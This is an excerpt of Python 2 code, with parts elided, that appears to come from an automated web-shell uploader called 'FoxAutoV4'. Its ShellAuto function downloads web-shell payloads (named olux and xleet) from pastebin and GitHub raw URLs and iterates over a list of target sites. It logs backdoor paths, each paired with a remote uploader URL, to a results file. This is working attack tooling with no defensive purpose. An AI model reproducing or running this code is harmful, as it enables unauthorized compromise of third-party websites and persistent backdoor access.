...
def ShellAuto():
	try :
		...
		if w == 16 :
			...
			if tyShell == 1 :
				try :
					srcShell = requests.get('https://pastebin.com/raw/nrYUz2Z7', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('https://raw.githubusercontent.com/JExCoders/AnyFox/master/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('https://raw.githubusercontent.com/JExCoders/AnyFox/master/olux.txt', headers=headers,timeout=15).content
			elif tyShell == 2 :
				try :
					srcShell = requests.get('https://pastebin.com/raw/NuNQhnT3', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('https://raw.githubusercontent.com/JExCoders/AnyFox/master/xleet.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('https://raw.githubusercontent.com/JExCoders/AnyFox/master/olux.txt', headers=headers,timeout=15).content
			elif tyShell == 3 :
				nameF = str(raw_input('\n Filename --> : '))
		...
		for site in sites :
			...
			try :
				...
				if 'FoxAutoV4' in check:
					...
					open('Results/backdor.txt', 'a').write(shell_path+'?php=https://raw.githubusercontent.com/JExCoders/AnyFox/master/up.txt\n')
					if w == 1 :
